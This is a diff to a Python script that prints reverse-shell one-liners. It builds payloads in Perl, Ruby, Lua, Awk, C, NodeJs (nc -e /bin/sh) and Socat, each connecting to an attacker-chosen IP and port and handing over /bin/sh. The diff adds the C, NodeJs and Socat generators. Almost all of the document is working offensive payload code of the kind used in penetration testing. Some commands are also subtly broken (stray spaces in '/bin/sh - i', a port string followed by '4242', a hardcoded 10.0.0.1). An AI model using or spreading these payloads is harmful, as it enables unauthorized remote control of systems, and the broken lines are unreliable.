@@ -104,28 +104,33 @@ for element in generate[0]:
     if element == "perl":
         print("\n### Perl Reverse Shell ###\n")
         print("For Linux:")
-        print('perl -e \'use Socket;$i="'+ip+'";$p='+lport+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN," > &S");open(STDOUT," > &S");open(STDERR," > &S");exec("/bin/sh - i");};\'')
-        
+        print('perl -e \'use Socket;$i="'+ip+'";$p='+lport +
+              ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN," > &S");open(STDOUT," > &S");open(STDERR," > &S");exec("/bin/sh - i");};\'')
+
         print("\nFor Windows:")
-        print('perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"'+ip+':'+lport+'4242"); STDIN -> fdopen($c, r); $~ -> fdopen($c, w); system$_ while <> ; \'')
+        print('perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"'+ip+':'+lport +
+              '4242"); STDIN -> fdopen($c, r); $~ -> fdopen($c, w); system$_ while <> ; \'')
         print("\n------------------------------------------------------------------------")
-    
+
     if element == "ruby":
         print("\n### Ruby Reverse Shell ###\n")
 
         print("For Linux:")
-        print(f'ruby -rsocket -e \'f=TCPSocket.open("{ip}",{lport}).to_i;exec sprintf("/bin/sh - i < & % d > & % d 2 > & % d", f, f, f)\'')
+        print(
+            f'ruby -rsocket -e \'f=TCPSocket.open("{ip}",{lport}).to_i;exec sprintf("/bin/sh - i < & % d > & % d 2 > & % d", f, f, f)\'')
 
         print("\nFor Windows:")
-        print('ruby -rsocket -e \'c=TCPSocket.new("'+ip+'","'+lport+'");while(cmd=c.gets);IO.popen(cmd,"r"){ | io|c.print io.read}end\'')
+        print('ruby -rsocket -e \'c=TCPSocket.new("'+ip+'","'+lport +
+              '");while(cmd=c.gets);IO.popen(cmd,"r"){ | io|c.print io.read}end\'')
 
         print("\n------------------------------------------------------------------------")
 
     if element == "lua":
         print("\n### Lua Reverse Shell ###\n")
-        
+
         print("For Linux:")
-        print(f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{lport}');os.execute('/bin/sh - i <&3 >&3 2>&3'); \"")
+        print(
+            f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{lport}');os.execute('/bin/sh - i <&3 >&3 2>&3'); \"")
 
         print("\nFor Windows:")
         print('lua5.1 -e \'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp: close()\'')
@@ -134,11 +139,41 @@ for element in generate[0]:
     if element == "awk":
         print("\n### Awk Reverse Shell ###\n")
 
-        print('awk \'BEGIN {s = "/inet/tcp/0/'+ip+'/'+lport+'"; while(42) { do{ printf "shell > " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null')
+        print('awk \'BEGIN {s = "/inet/tcp/0/'+ip+'/'+lport +
+              '"; while(42) { do{ printf "shell > " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null')
 
         print("\n------------------------------------------------------------------------")
 
     if element == "C":
         print("\n### C Reverse Shell ###\n")
 
-print()
+        print('#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n\tint port='+lport+';\n\tstruct sockaddr_in revsockaddr;\n\n\tint sockt=socket(AF_INET, SOCK_STREAM, 0);\n\trevsockaddr.sin_family=AF_INET;\n\trevsockaddr.sin_port=htons(port);\n\trevsockaddr.sin_addr.s_addr=inet_addr("' +
+              ip+'");\n\tconnect(sockt, (struct sockaddr *) & revsockaddr,\n\tsizeof(revsockaddr));\n\tdup2(sockt, 0);\n\tdup2(sockt, 1);\n\tdup2(sockt, 2);\n\n\tchar * const argv[]={"/bin/sh", NULL};\n\texecve("/bin/sh", argv, NULL);\n\n\treturn 0;\n}')
+
+        print("\n------------------------------------------------------------------------")
+
+    if element == "NodeJs":
+        print("\n### NodeJs Reverse Shell ###\n")
+
+        print(f"require('child_process').exec('nc -e /bin/sh {ip} {lport}')")
+
+        print("\n------------------------------------------------------------------------")
+
+    if element == "OpenSSL":
+        print("\n### OpenSSL Reverse Shell (TLS-PSK) ###\n")
+
+        # TODO Think of how to get the generated OpenSSL random value and dynamically place it into the commands
+
+    if element == "Socat":
+        print("\n### Socat Reverse Shell ###\n")
+
+        print("Attacker:")
+        print(f"socat file:`tty`,raw,echo=0 TCP-L:{lport}")
+
+        print("\nVictim:")
+        print(
+            f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{lport}")
+
+        print("\n------------------------------------------------------------------------")
+
+print("End of Shell Command Generation")
